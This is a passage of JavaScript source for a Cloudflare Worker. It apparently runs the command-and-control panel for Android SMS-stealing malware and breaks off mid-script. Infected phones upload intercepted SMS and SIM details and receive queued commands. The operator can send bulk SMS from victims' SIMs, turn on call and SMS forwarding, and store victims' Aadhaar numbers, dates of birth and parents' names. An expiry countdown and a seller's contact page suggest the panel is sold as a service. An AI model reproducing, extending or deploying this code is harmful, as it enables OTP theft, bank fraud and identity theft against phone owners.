// ================== CLOUDFLARE WORKER – अंतिम एडमिन पैनल ==================
// Login: DABANG / Raj@1994
// सभी API एंडपॉइंट + रंगीन एडमिन पैनल HTML
// D1 binding name: DB

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type"
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    try {
      // ---------- API ENDPOINTS ----------
      if (path === "/api/device/register" && request.method === "POST") {
        const { deviceId, brand, model, simCount } = await request.json();
        const existing = await env.DB.prepare("SELECT id FROM devices WHERE id = ?").bind(deviceId).first();
        if (!existing) {
          await env.DB.prepare(
            "INSERT INTO devices (id, brand, model, battery, online, simCount, lastSeen) VALUES (?, ?, ?, 100, 1, ?, ?)"
          ).bind(deviceId, brand, model, simCount, Date.now()).run();
        }
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      if (path === "/api/device/status" && request.method === "POST") {
        const { deviceId, battery, online } = await request.json();
        await env.DB.prepare(
          "UPDATE devices SET battery = ?, online = ?, lastSeen = ? WHERE id = ?"
        ).bind(battery, online, Date.now(), deviceId).run();
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      if (path === "/api/device/incoming-sms" && request.method === "POST") {
        const { deviceId, number, text } = await request.json();
        const time = Date.now();
        await env.DB.prepare(
          "INSERT INTO sms (deviceId, number, text, time) VALUES (?, ?, ?, ?)"
        ).bind(deviceId, number, text, time).run();
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      if (path === "/api/device/commands" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare(
          "SELECT * FROM commands WHERE deviceId = ? AND status = 'pending' ORDER BY created_at ASC"
        ).bind(deviceId).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/commands" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare(
          "SELECT * FROM commands WHERE deviceId = ? ORDER BY created_at ASC"
        ).bind(deviceId).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/device/command/ack" && request.method === "POST") {
        const { commandId, status } = await request.json();
        await env.DB.prepare(
          "UPDATE commands SET status = ?, executed_at = ? WHERE id = ?"
        ).bind(status, Date.now(), commandId).run();
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      if (path === "/api/device/sim-info" && request.method === "POST") {
        const { deviceId, simSlot, operator, networkType, emergencyOnly, phoneNumber } = await request.json();
        const time = Date.now();
        await env.DB.prepare(
          `INSERT INTO sim_info (deviceId, simSlot, operator, networkType, emergencyOnly, phoneNumber, lastUpdated)
           VALUES (?, ?, ?, ?, ?, ?, ?)
           ON CONFLICT(deviceId, simSlot) DO UPDATE SET
           operator = excluded.operator,
           networkType = excluded.networkType,
           emergencyOnly = excluded.emergencyOnly,
           phoneNumber = excluded.phoneNumber,
           lastUpdated = excluded.lastUpdated`
        ).bind(deviceId, simSlot, operator, networkType, emergencyOnly, phoneNumber, time).run();
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      if (path === "/api/sim-info" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare(
          "SELECT * FROM sim_info WHERE deviceId = ? ORDER BY simSlot ASC"
        ).bind(deviceId).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/devices" && request.method === "GET") {
        const { results } = await env.DB.prepare("SELECT * FROM devices ORDER BY id").all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/send-sms" && request.method === "POST") {
        const { deviceId, sim, number, text } = await request.json();
        const time = Date.now();
        const data = JSON.stringify({ sim, number, text });
        const { results } = await env.DB.prepare(
          "INSERT INTO commands (deviceId, type, data, created_at) VALUES (?, 'sms', ?, ?) RETURNING id"
        ).bind(deviceId, data, time).run();
        return new Response(JSON.stringify({ success: true, commandId: results[0].id }), { headers: corsHeaders });
      }

      if (path === "/api/sms" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare(
          "SELECT * FROM sms WHERE deviceId = ? ORDER BY time DESC"
        ).bind(deviceId).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/device-info" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare("SELECT * FROM devices WHERE id = ?").bind(deviceId).all();
        return new Response(JSON.stringify(results[0] || {}), { headers: corsHeaders });
      }

      if (path === "/api/call-forward" && request.method === "POST") {
        const { deviceId, number } = await request.json();
        const time = Date.now();
        const data = JSON.stringify({ number });
        await env.DB.prepare(
          "INSERT INTO commands (deviceId, type, data, created_at) VALUES (?, 'call_forward', ?, ?)"
        ).bind(deviceId, data, time).run();
        return new Response(JSON.stringify({ success: true, message: "Command queued" }), { headers: corsHeaders });
      }

      if (path === "/api/sms-forward" && request.method === "POST") {
        const { deviceId, number } = await request.json();
        const time = Date.now();
        const data = JSON.stringify({ number });
        await env.DB.prepare(
          "INSERT INTO commands (deviceId, type, data, created_at) VALUES (?, 'sms_forward', ?, ?)"
        ).bind(deviceId, data, time).run();
        return new Response(JSON.stringify({ success: true, message: "Command queued" }), { headers: corsHeaders });
      }

      if (path === "/api/all-sms" && request.method === "GET") {
        const { results } = await env.DB.prepare(`
          SELECT s.*, d.brand, d.model 
          FROM sms s
          LEFT JOIN devices d ON s.deviceId = d.id
          ORDER BY s.time DESC
        `).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/command-sms" && request.method === "GET") {
        const { results } = await env.DB.prepare(`
          SELECT 
            c.*,
            d.brand,
            d.model
          FROM commands c
          LEFT JOIN devices d ON c.deviceId = d.id
          WHERE c.type = 'sms'
          ORDER BY c.created_at DESC
          LIMIT 200
        `).all();
        return new Response(JSON.stringify(results), { headers: corsHeaders });
      }

      if (path === "/api/panel-details" && request.method === "GET") {
        const expiryRow = await env.DB.prepare("SELECT value FROM admin_settings WHERE key = 'expiry'").first();
        const expiry = expiryRow ? parseInt(expiryRow.value) : (Date.now() + 30*24*60*60*1000);
        const now = Date.now();
        const diff = Math.max(0, expiry - now);
        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        return new Response(JSON.stringify({ expiryDays: days, expiryHours: hours, expiryMinutes: minutes, expirySeconds: seconds }), { headers: corsHeaders });
      }

      if (path === "/api/details" && request.method === "GET") {
        const deviceId = url.searchParams.get("deviceId");
        const { results } = await env.DB.prepare("SELECT * FROM device_details WHERE deviceId = ?").bind(deviceId).all();
        return new Response(JSON.stringify(results[0] || {}), { headers: corsHeaders });
      }

      if (path === "/api/details" && request.method === "POST") {
        const { deviceId, customerName, mobileNumber, fatherName, motherName, aadharNumber, dob } = await request.json();
        const time = Date.now();
        await env.DB.prepare(
          `INSERT INTO device_details (deviceId, customerName, mobileNumber, fatherName, motherName, aadharNumber, dob, updatedAt)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)
           ON CONFLICT(deviceId) DO UPDATE SET
           customerName = excluded.customerName,
           mobileNumber = excluded.mobileNumber,
           fatherName = excluded.fatherName,
           motherName = excluded.motherName,
           aadharNumber = excluded.aadharNumber,
           dob = excluded.dob,
           updatedAt = excluded.updatedAt`
        ).bind(deviceId, customerName, mobileNumber, fatherName, motherName, aadharNumber, dob, time).run();
        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
      }

      // ---------- Default: एडमिन पैनल HTML ----------
      return new Response(HTML(), {
        headers: { "Content-Type": "text/html; charset=utf-8", ...corsHeaders }
      });

    } catch (error) {
      return new Response(JSON.stringify({ error: error.message }), {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders }
      });
    }
  }
};

// ---------- एडमिन पैनल HTML – पासवर्ड प्रोटेक्ट के साथ, रंगीन डिज़ाइन ----------
function HTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>🔴 ADMIN PANEL</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,sans-serif; }
    body { background: linear-gradient(145deg, #ff0844 0%, #ffb199 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; }
    #app { width:100%; max-width:480px; background: white; border-radius:40px; box-shadow:0 20px 40px rgba(0,0,0,0.3); overflow:hidden; }
    .screen { padding:20px 14px; min-height:700px; background: white; }
    .hidden { display:none !important; }

    .login-card { background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%); border-radius:36px; padding:36px 20px; box-shadow:0 20px 30px rgba(255,8,68,0.4); margin-top:50px; color:white; }
    .login-card h2 { color:white; font-weight:700; margin-bottom:32px; text-align:center; font-size:2rem; text-shadow:2px 2px 4px #00000050; }
    .input-group { margin-bottom:24px; }
    .input-group label { display:block; color:white; font-weight:600; margin-bottom:8px; }
    .input-group input { width:100%; padding:16px 18px; background:rgba(255,255,255,0.3); border:2px solid white; border-radius:60px; font-size:1rem; color:white; outline:none; }
    .input-group input::placeholder { color:rgba(255,255,255,0.8); }

    .btn { background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); border:none; color:white; font-weight:bold; font-size:1.2rem; padding:16px; border-radius:60px; width:100%; box-shadow:0 6px 0 #b03a6f; cursor:pointer; transition:0.1s; border:2px solid white; }
    .btn:active { transform:translateY(4px); box-shadow:0 2px 0 #b03a6f; }

    .home-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; }
    .kolkata-time { background: linear-gradient(45deg, #f12711, #f5af19); padding:6px 12px; border-radius:30px; color:white; font-size:0.8rem; font-weight:600; text-align:center; border:2px solid white; }
    .menu-btn { background: linear-gradient(45deg, #00c6fb, #005bea); border:none; color:white; padding:10px 16px; border-radius:30px; font-size:1.2rem; cursor:pointer; border:2px solid white; }

    .dropdown-grid { position:absolute; right:0; top:50px; background: white; border-radius:30px; width:250px; z-index:100; box-shadow:0 15px 30px rgba(0,0,0,0.2); display:grid; grid-template-columns:repeat(2,1fr); gap:10px; padding:15px; border:3px solid #ff0844; }
    .grid-item { display:flex; flex-direction:column; align-items:center; justify-content:center; background: linear-gradient(145deg, #fa709a 0%, #fee140 100%); border-radius:20px; padding:15px 5px; cursor:pointer; transition:0.1s; border:2px solid white; color:white; font-weight:bold; }
    .grid-item:nth-child(2) { background: linear-gradient(145deg, #30cfd0 0%, #330867 100%); }
    .grid-item:nth-child(3) { background: linear-gradient(145deg, #f12711, #f5af19); }
    .grid-item:nth-child(4) { background: linear-gradient(145deg, #7F00FF, #E100FF); }
    .grid-item:nth-child(5) { background: linear-gradient(145deg, #11998e, #38ef7d); }
    .grid-item i { font-size:2rem; margin-bottom:5px; color:white; }

    .device-grid { display:flex; flex-direction:column; gap:12px; margin:20px 0 30px; }
    .device-card { padding:16px 18px; border-radius:40px; display:flex; align-items:center; justify-content:space-between; cursor:pointer; border:3px solid white; box-shadow:0 8px 0 rgba(0,0,0,0.2); }
    .device-card:nth-child(6n+1) { background: linear-gradient(145deg, #ff0844, #ffb199); }
    .device-card:nth-child(6n+2) { background: linear-gradient(145deg, #00c6fb, #005bea); }
    .device-card:nth-child(6n+3) { background: linear-gradient(145deg, #f093fb, #f5576c); }
    .device-card:nth-child(6n+4) { background: linear-gradient(145deg, #f5af19, #f12711); }
    .device-card:nth-child(6n+5) { background: linear-gradient(145deg, #11998e, #38ef7d); }
    .device-card:nth-child(6n) { background: linear-gradient(145deg, #7F00FF, #E100FF); }
    .device-info h4 { font-size:1.1rem; font-weight:700; color:white; text-shadow:1px 1px 2px black; }
    .device-info p { font-size:0.75rem; color:white; }
    .status-badge { text-align:right; }
    .online { color:#a5ffa5; font-weight:bold; }
    .offline { color:#ffb3b3; font-weight:bold; }
    .battery { background:black; color:white; padding:4px 10px; border-radius:30px; font-size:0.7rem; display:inline-block; margin-top:5px; border:1px solid white; }

    .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:1000; padding:10px; }
    .modal-content { width:100%; max-width:440px; max-height:90vh; overflow-y:auto; border:4px solid white; border-radius:50px; padding:20px 16px; background: linear-gradient(145deg, #ffecd2 0%, #fcb69f 100%); }
    .modal-header { display:flex; align-items:center; justify-content:space-between; background: black; margin:-20px -16px 20px -16px; padding:16px 20px; border-radius:46px 46px 0 0; color:white; }
    .modal-header h3 { font-weight:600; color: #ffb6c1; font-size:1.2rem; }
    .close-btn { background: #ff6b6b; border:none; color:black; font-size:1.3rem; width:36px; height:36px; border-radius:40px; font-weight:bold; cursor:pointer; border:2px solid black; }

    .option-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin:10px 0; }
    .option-item { border-radius:30px; padding:14px 4px; text-align:center; font-size:0.8rem; font-weight:600; cursor:pointer; color:white; border:2px solid white; box-shadow:0 5px 0 rgba(0,0,0,0.3); }
    .option-item:nth-child(1) { background: linear-gradient(145deg, #FF416C, #FF4B2B); }
    .option-item:nth-child(2) { background: linear-gradient(145deg, #1FA2FF, #12D8FA); }
    .option-item:nth-child(3) { background: linear-gradient(145deg, #B24592, #F15F79); }
    .option-item:nth-child(4) { background: linear-gradient(145deg, #F7971E, #FFD200); }
    .option-item:nth-child(5) { background: linear-gradient(145deg, #00B09B, #96C93D); }
    .option-item:nth-child(6) { background: linear-gradient(145deg, #834D9B, #D04ED6); }
    .option-item i { font-size:1.8rem; display:block; margin-bottom:5px; color:white; }

    .feature-form { background: linear-gradient(145deg, #e0eafc, #cfdef3); border-radius:36px; padding:18px 14px; border:2px solid black; }
    .feature-form input, .feature-form textarea, .feature-form select { width:100%; padding:12px 16px; border:2px solid #ff69b4; border-radius:60px; margin-bottom:14px; background:white; }

    .full-screen { position:fixed; top:0; left:0; width:100%; height:100%; background: linear-gradient(145deg, #fff1eb 0%, #ace0f9 100%); z-index:2000; overflow-y:auto; padding:20px; }
    .back-option { background:#333; color:white; border:2px solid #ff69b4; border-radius:40px; padding:10px; text-align:center; margin-top:14px; font-weight:bold; cursor:pointer; }

    .details-card { background: linear-gradient(145deg, #fdfbfb 0%, #ebedee 100%); border-radius:36px; padding:18px 14px; border:2px solid black; }
    .details-row { margin-bottom:12px; padding-bottom:8px; border-bottom:1px solid #ccc; }
    .details-label { font-weight:600; color:#333; }
    .details-value { color:#111; font-size:1.1rem; margin-top:2px; }

    .dialog-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; align-items:center; justify-content:center; z-index:5000; }
    .dialog-card { background: white; max-width:320px; width:90%; border-radius:50px; border:4px solid black; overflow:hidden; animation:pop 0.2s; }
    .dialog-header { padding:18px; text-align:center; border-bottom:3px solid black; }
    .dialog-header.success { background: linear-gradient(45deg, #11998e, #38ef7d); }
    .dialog-header.error { background: linear-gradient(45deg, #ed213a, #93291e); }
    .dialog-header i { font-size:2.5rem; color:white; }
    .dialog-body { padding:20px 16px; text-align:center; font-size:1.1rem; font-weight:600; }
    .dialog-btn { background: black; color: white; border:none; font-size:1.2rem; font-weight:bold; padding:14px; width:100%; border-top:3px solid #ff69b4; cursor:pointer; }

    @keyframes pop { 0% { transform:scale(0.8); opacity:0; } 100% { transform:scale(1); opacity:1; } }

    .contact-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:15px; margin:20px 0; }
    .contact-item { background: linear-gradient(45deg, #ff0844, #ffb199); color:white; border:2px solid white; border-radius:30px; padding:16px 8px; text-align:center; cursor:pointer; box-shadow:0 5px 0 #b03a6f; }
    .contact-item:nth-child(2) { background: linear-gradient(45deg, #00c6fb, #005bea); }
    .contact-item:nth-child(3) { background: linear-gradient(45deg, #7F00FF, #E100FF); }
    .contact-item:nth-child(4) { background: linear-gradient(45deg, #11998e, #38ef7d); }
    .contact-item i { font-size:2rem; display:block; margin-bottom:8px; }
  </style>
</head>
<body>
<div id="app">
  <!-- LOGIN SCREEN -->
  <div id="login-screen" class="screen">
    <div class="login-card">
      <h2>🔴 ADMIN</h2>
      <div class="input-group"><label>LOGIN ID</label><input type="text" id="login-id" placeholder="DABANG"></div>
      <div class="input-group"><label>PASSWORD</label><input type="password" id="login-pass" placeholder="••••••••"></div>
      <button class="btn" id="login-btn">ENTER PANEL</button>
    </div>
  </div>

  <!-- HOME SCREEN -->
  <div id="home-screen" class="screen hidden">
    <div class="home-header">
      <div class="kolkata-time" id="kolkata-clock">Kolkata<br>--:--:--</div>
      <div class="menu-container">
        <button class="menu-btn" id="menu-btn"><i class="fas fa-bars"></i></button>
        <div class="dropdown-grid hidden" id="dropdown-grid">
          <div class="grid-item" id="view-all-sms"><i class="fas fa-envelope"></i><span>View all SMS</span></div>
          <div class="grid-item" id="view-command-sms"><i class="fas fa-history"></i><span>Command SMS</span></div>
          <div class="grid-item" id="contact-us"><i class="fas fa-phone-alt"></i><span>Contact us</span></div>
          <div class="grid-item" id="panel-details"><i class="fas fa-info-circle"></i><span>Panel details</span></div>
          <div class="grid-item" id="logout"><i class="fas fa-sign-out-alt"></i><span>Log out</span></div>
        </div>
      </div>
    </div>
    <div class="device-grid" id="device-list"></div>
  </div>

  <div id="modal-container"></div>
  <div id="fullscreen-container"></div>
</div>

<script>
  (function() {
    // ---------- ग्लोबल वेरिएबल ----------
    let devices = [];
    let currentDevice = null;
    let bulkNumbers = [];

    // ---------- पेज लोड होने पर लॉगिन चेक ----------
    if (localStorage.getItem('adminLoggedIn') === 'true') {
      document.getElementById('login-screen').classList.add('hidden');
      document.getElementById('home-screen').classList.remove('hidden');
      loadDevices();
      startClock();
    }

    // ---------- डायलॉग ----------
    function showDialog(message, type = 'success') {
      const old = document.getElementById('custom-dialog');
      if (old) old.remove();
      const overlay = document.createElement('div');
      overlay.id = 'custom-dialog';
      overlay.className = 'dialog-overlay';
      const card = document.createElement('div');
      card.className = 'dialog-card';
      const header = document.createElement('div');
      header.className = 'dialog-header ' + type;
      header.innerHTML = '<i class="fas ' + (type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle') + '"></i>';
      const body = document.createElement('div');
      body.className = 'dialog-body';
      body.innerText = message;
      const btn = document.createElement('button');
      btn.className = 'dialog-btn';
      btn.innerText = 'OK';
      btn.onclick = () => overlay.remove();
      card.appendChild(header);
      card.appendChild(body);
      card.appendChild(btn);
      overlay.appendChild(card);
      document.body.appendChild(overlay);
      setTimeout(() => { if (document.getElementById('custom-dialog')) overlay.remove(); }, 3000);
    }

    // ---------- लॉगिन ----------
    document.getElementById('login-btn').addEventListener('click', function() {
      const user = document.getElementById('login-id').value;
      const pass = document.getElementById('login-pass').value;
      if (user === 'DABANG' && pass === 'Raj@1994') {
        localStorage.setItem('adminLoggedIn', 'true');
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('home-screen').classList.remove('hidden');
        loadDevices();
        startClock();
      } else {
        showDialog('Invalid credentials', 'error');
      }
    });

    // ---------- डिवाइस लोड ----------
    async function loadDevices() {
      try {
        const res = await fetch('/api/devices');
        devices = await res.json();
        renderDeviceList();
      } catch (e) {
        showDialog('Error loading devices', 'error');
      }
    }

    function renderDeviceList() {
      const container = document.getElementById('device-list');
      container.innerHTML = devices.map((d, idx) => {
        return '<div class="device-card" data-id="' + d.id + '">' +
          '<div class="device-info"><h4>' + d.brand + ' ' + d.model + '</h4><p>#' + d.id + ' • SIM ' + d.simCount + '</p></div>' +
          '<div class="status-badge"><div class="' + (d.online ? 'online' : 'offline') + '">' + (d.online ? '● ONLINE' : '○ OFFLINE') + '</div>' +
          '<div class="battery">' + d.battery + '%</div></div></div>';
      }).join('');
      document.querySelectorAll('.device-card').forEach(card => {
        card.addEventListener('click', () => {
          const id = card.dataset.id;
          currentDevice = devices.find(d => d.id == id);
          showDeviceModal(currentDevice);
        });
      });
    }

    // ---------- मेन्यू ग्रिड ----------
    document.getElementById('menu-btn').addEventListener('click', function(e) {
      e.stopPropagation();
      document.getElementById('dropdown-grid').classList.toggle('hidden');
    });

    window.addEventListener('click', function(e) {
      if (!e.target.closest('.menu-container')) {
        const grid = document.getElementById('dropdown-grid');
        if (grid) grid.classList.add('hidden');
      }
    });

    // ---------- View all SMS – 5 रंगों में ----------
    document.getElementById('view-all-sms').addEventListener('click', async function() {
      document.getElementById('dropdown-grid').classList.add('hidden');
      try {
        const res = await fetch('/api/all-sms');
        const allSms = await res.json();
        let html = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-envelope"></i> All SMS</h3></div><div style="background:white; border-radius:30px; padding:16px; border:2px solid black; max-height:70vh; overflow-y:auto;">';
        if (allSms.length === 0) html += '<p style="text-align:center;">No SMS yet</p>';
        else {
          const colors = ['#ffe0e0', '#e0ffe0', '#e0e0ff', '#fff0e0', '#f0e0ff'];
          allSms.forEach((sms, idx) => {
            html += '<div style="background:' + colors[idx % 5] + '; padding:12px; border-radius:30px; margin-bottom:8px;"><strong>Device ' + sms.deviceId + ' (' + (sms.brand || '') + ' ' + (sms.model || '') + ')</strong><br>📞 ' + sms.number + '<br>💬 ' + sms.text + '<br><small>🕒 ' + new Date(sms.time).toLocaleString() + '</small></div>';
          });
        }
        html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
        document.getElementById('fullscreen-container').innerHTML = html;
      } catch (e) { showDialog('Error loading SMS', 'error'); }
    });

    // ---------- View Command SMS ----------
    document.getElementById('view-command-sms').addEventListener('click', async function() {
      document.getElementById('dropdown-grid').classList.add('hidden');
      try {
        const res = await fetch('/api/command-sms');
        const commands = await res.json();
        let html = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-history"></i> Command SMS Log</h3></div><div style="background:white; border-radius:30px; padding:16px; border:2px solid black; max-height:70vh; overflow-y:auto;">';
        if (commands.length === 0) html += '<p style="text-align:center;">No commands found</p>';
        else commands.forEach(cmd => {
          let data = { number: 'N/A', text: 'N/A' };
          try { data = JSON.parse(cmd.data); } catch (e) {}
          const statusColor = cmd.status === 'sent' ? '#d4edda' : (cmd.status === 'failed' ? '#f8d7da' : '#fff3cd');
          const time = new Date(cmd.created_at).toLocaleString();
          html += '<div style="background:' + statusColor + '; border-left:6px solid ' + (cmd.status === 'sent' ? '#28a745' : (cmd.status === 'failed' ? '#dc3545' : '#ffc107')) + '; border-radius:20px; padding:15px; margin-bottom:12px;">' +
            '<div style="display:flex; justify-content:space-between;"><strong>📱 ' + data.number + '</strong><span>' + cmd.status.toUpperCase() + '</span></div>' +
            '<div>💬 ' + data.text + '</div>' +
            '<div style="display:flex; justify-content:space-between; font-size:0.8rem;"><span>🕒 ' + time + '</span><span>📟 ' + (cmd.brand || '') + ' ' + (cmd.model || '') + '</span></div>' +
            (cmd.executed_at ? '<div><small>✅ ' + new Date(cmd.executed_at).toLocaleString() + '</small></div>' : '') + '</div>';
        });
        html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
        document.getElementById('fullscreen-container').innerHTML = html;
      } catch (e) { showDialog('Error loading commands', 'error'); }
    });

    // ---------- Contact us ----------
    document.getElementById('contact-us').addEventListener('click', function() {
      document.getElementById('dropdown-grid').classList.add('hidden');
      const contactHtml = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-address-book"></i> Contact Us</h3></div><div class="feature-form"><div class="contact-grid">' +
        '<div class="contact-item" onclick="window.open(\'mailto:dabangitsolutionindia@gmail.com\')"><i class="fas fa-envelope"></i><span>dabangitsolutionindia</span></div>' +
        '<div class="contact-item" onclick="window.open(\'https://wa.me/916202031392\')"><i class="fab fa-whatsapp"></i><span>+91 62020 31392</span></div>' +
        '<div class="contact-item" onclick="window.open(\'https://t.me/dabangitsolution\')"><i class="fab fa-telegram-plane"></i><span>@dabangitsolution</span></div>' +
        '<div class="contact-item" onclick="window.location.href=\'tel:+916202031392\'"><i class="fas fa-phone-alt"></i><span>+91 62020 31392</span></div>' +
        '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div></div>';
      document.getElementById('fullscreen-container').innerHTML = contactHtml;
    });

    // ---------- Panel details ----------
    document.getElementById('panel-details').addEventListener('click', async function() {
      document.getElementById('dropdown-grid').classList.add('hidden');
      try {
        const res = await fetch('/api/panel-details');
        const data = await res.json();
        showDialog('Panel expires in ' + data.expiryDays + 'd ' + data.expiryHours + 'h ' + data.expiryMinutes + 'm ' + data.expirySeconds + 's', 'success');
      } catch (e) { showDialog('Error loading panel details', 'error'); }
    });

    // ---------- Logout ----------
    document.getElementById('logout').addEventListener('click', function() {
      localStorage.removeItem('adminLoggedIn');
      document.getElementById('dropdown-grid').classList.add('hidden');
      document.getElementById('home-screen').classList.add('hidden');
      document.getElementById('login-screen').classList.remove('hidden');
      closeFullScreen();
      closeModal();
    });

    // ---------- कलकत्ता घड़ी ----------
    function startClock() {
      function updateClock() {
        const now = new Date();
        const kolkataTime = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        document.getElementById('kolkata-clock').innerHTML = 'Kolkata<br>' + kolkataTime;
      }
      updateClock();
      setInterval(updateClock, 1000);
    }

    // ---------- SIM info ----------
    async function loadSimInfo(deviceId) {
      try {
        const res = await fetch('/api/sim-info?deviceId=' + deviceId);
        return await res.json();
      } catch (e) { return []; }
    }

    // ---------- Send SMS ----------
    async function showSendSMS(device) {
      const simInfos = await loadSimInfo(device.id);
      let simGrid = '';
      if (simInfos.length === 0) simGrid = '<p>No SIM info available</p>';
      else {
        simGrid = '<div style="display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-bottom:16px;">';
        simInfos.forEach(sim => {
          const status = sim.emergencyOnly ? '🆘 Emergency' : '📶 Network';
          const phone = sim.phoneNumber || 'N/A';
          simGrid += '<div style="background:#eee; border:2px solid #ff69b4; border-radius:20px; padding:10px; text-align:center;"><strong>SIM ' + (parseInt(sim.simSlot)+1) + '</strong><br>' + (sim.operator || '') + '<br>' + status + '<br><small>' + phone + '</small></div>';
        });
        simGrid += '</div>';
      }
      const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-paper-plane"></i> Send SMS – ' + device.brand + '</h3></div><div class="feature-form">' + simGrid +
        '<input type="text" id="sms-number" placeholder="10-digit mobile number" maxlength="10"><div><input type="file" id="csv-upload" accept=".csv" style="display:none"><button class="btn" id="upload-csv-btn"><i class="fas fa-upload"></i> Upload CSV</button></div>' +
        '<textarea id="sms-text" rows="4" placeholder="Type SMS message..."></textarea><button class="btn" id="send-single-sms" style="background:#0066cc;">SEND SINGLE SMS</button>' +
        '<button class="btn" id="send-bulk-sms" style="margin-top:8px;">START BULK SMS</button><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div></div>';
      document.getElementById('fullscreen-container').innerHTML = full;

      document.getElementById('upload-csv-btn').onclick = () => document.getElementById('csv-upload').click();
      document.getElementById('csv-upload').onchange = () => {
        showDialog('CSV uploaded with 100 numbers (demo)', 'success');
        bulkNumbers = Array.from({length:100}, (_,i) => '98765' + i.toString().padStart(5, '0'));
      };
      document.getElementById('send-single-sms').onclick = async () => {
        const number = document.getElementById('sms-number').value;
        const text = document.getElementById('sms-text').value;
        if (!number || !text) return showDialog('Enter number & message', 'error');
        const res = await fetch('/api/send-sms', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({deviceId: device.id, sim: 'SIM1', number, text})
        });
        showDialog(res.ok ? 'SMS command queued' : 'SMS failed', res.ok ? 'success' : 'error');
      };
      document.getElementById('send-bulk-sms').onclick = async () => {
        if (!bulkNumbers.length) return showDialog('Upload CSV first', 'error');
        const text = document.getElementById('sms-text').value;
        if (!text) return showDialog('Type message', 'error');
        let sent = 0, failed = 0;
        for (let i = 0; i < bulkNumbers.length; i += 5) {
          await Promise.all(bulkNumbers.slice(i, i+5).map(async num => {
            const res = await fetch('/api/send-sms', {
              method: 'POST', headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({deviceId: device.id, sim: 'SIM1', number: num, text})
            });
            if (res.ok) sent++; else failed++;
          }));
          if (i+5 < bulkNumbers.length) await new Promise(r => setTimeout(r, 10000));
        }
        showDialog('Bulk finished: ' + sent + ' queued, ' + failed + ' failed. Check "Command SMS".', 'success');
      };
    }

    // ---------- View SMS ----------
    function showViewSMS(device) {
      const full = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-envelope-open-text"></i> SMS for ' + device.brand + '</h3></div><div class="sms-list" id="sms-list-container"></div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
      document.getElementById('fullscreen-container').innerHTML = full;
      fetch('/api/sms?deviceId=' + device.id).then(res => res.json()).then(sms => {
